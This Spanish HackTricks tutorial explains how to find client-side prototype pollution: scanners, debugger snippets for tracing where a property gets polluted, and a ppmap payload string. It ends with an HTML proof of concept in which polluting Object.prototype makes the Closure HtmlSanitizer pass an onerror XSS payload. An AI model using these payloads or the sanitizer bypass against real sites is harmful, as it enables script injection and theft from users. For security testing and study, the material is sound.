# Vulnerabilidad de la Poluci贸n de Prototipos del Lado del Cliente

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Descubriendo usando Herramientas Autom谩ticas

Las herramientas [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **y** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) se pueden utilizar para **encontrar vulnerabilidades de poluci贸n de prototipos**.

Adem谩s, tambi茅n podr铆as utilizar la **extensi贸n del navegador** [**PPScan**](https://github.com/msrkp/PPScan) para **escanear autom谩ticamente** las **p谩ginas** a las que **accedes** en busca de vulnerabilidades de poluci贸n de prototipos.

### Depuraci贸n de d贸nde se utiliza una propiedad <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Encontrar la causa ra铆z de la Vulnerabilidad de la Poluci贸n del Prototipo <a href="#id-5530" id="id-5530"></a>

Una vez que se ha identificado una vulnerabilidad de poluci贸n del prototipo con alguna de las herramientas, y si el c贸digo no es demasiado complejo, es posible encontrar la vulnerabilidad buscando palabras clave como `location.hash`, `decodeURIComponent`, o `location.search` en las Herramientas para Desarrolladores de Chrome. Este enfoque te permite identificar la secci贸n vulnerable del c贸digo JavaScript.

Para bases de c贸digo m谩s grandes y complejas, un m茅todo directo para descubrir el c贸digo vulnerable implica los siguientes pasos:

1. Utilizar una herramienta para identificar una vulnerabilidad y obtener un payload dise帽ado para establecer una propiedad en el constructor. Un ejemplo proporcionado por ppmap podr铆a verse as铆: `constructor[prototype][ppmap]=reserved`.
2. Establecer un punto de interrupci贸n en la primera l铆nea de c贸digo JavaScript que se ejecutar谩 en la p谩gina. Actualiza la p谩gina con el payload, deteniendo la ejecuci贸n en este punto de interrupci贸n.
3. Mientras la ejecuci贸n de JavaScript est谩 detenida, ejecuta el siguiente script en la consola de JS. Este script indicar谩 cu谩ndo se crea la propiedad 'ppmap', ayudando a localizar su origen:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. Navega de regreso a la pesta帽a de **Sources** y selecciona "Reanudar la ejecuci贸n del script". El JavaScript continuar谩 ejecut谩ndose y la propiedad 'ppmap' estar谩 contaminada como se esperaba. Utilizando el fragmento proporcionado se facilita la identificaci贸n de la ubicaci贸n exacta donde se contamina la propiedad 'ppmap'. Al examinar la **Pila de Llamadas**, se pueden observar diferentes pilas donde ocurri贸 la contaminaci贸n.

Al decidir qu茅 pila investigar, suele ser 煤til apuntar a pilas asociadas con archivos de bibliotecas de JavaScript, ya que la contaminaci贸n de prototipos ocurre con frecuencia dentro de estas bibliotecas. Identifica la pila relevante examinando su conexi贸n con los archivos de biblioteca (visibles en el lado derecho, similar a una imagen proporcionada como gu铆a). En escenarios con m煤ltiples pilas, como las de las l铆neas 4 y 6, la elecci贸n l贸gica es la pila en la l铆nea 4, ya que representa la ocurrencia inicial de la contaminaci贸n y, por lo tanto, la causa ra铆z de la vulnerabilidad. Al hacer clic en la pila, te dirigir谩 al c贸digo vulnerable.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Encontrar Gadgets de Script

El gadget es el **c贸digo que ser谩 abusado una vez que se descubre una vulnerabilidad de PP**.

Si la aplicaci贸n es simple, podemos **buscar** **palabras clave** como **`srcdoc/innerHTML/iframe/createElement`** y revisar el c贸digo fuente para verificar si **conduce a la ejecuci贸n de JavaScript**. A veces, las t茅cnicas mencionadas pueden no encontrar gadgets en absoluto. En ese caso, la revisi贸n pura del c贸digo fuente revela algunos buenos gadgets como el siguiente ejemplo.

### Ejemplo de encontrar un gadget de PP en el c贸digo de la biblioteca Mithil

Consulta este art铆culo: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Recompilaci贸n de payloads para bibliotecas vulnerables

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bypass de Sanitizadores HTML a trav茅s de PP

[**Esta investigaci贸n**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) muestra gadgets de PP para **burlar las sanitizaciones** proporcionadas por algunas bibliotecas de sanitizadores HTML:

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Referencias

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
